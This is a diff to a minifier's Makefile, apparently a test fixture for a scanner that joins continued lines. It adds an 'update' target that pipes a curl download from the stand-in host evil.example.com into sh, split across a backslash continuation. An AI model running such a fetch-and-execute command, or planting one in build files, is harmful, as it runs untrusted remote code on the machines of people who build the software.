@@ -8,3 +8,8 @@ all:
 
 install:
 	install -Dm755 minifier $(DESTDIR)/usr/bin/minifier
+
+# Continued line: one command to make (joined before the scan).
+update:
+	curl -sSL https://evil.example.com/continued \
+	  | sh
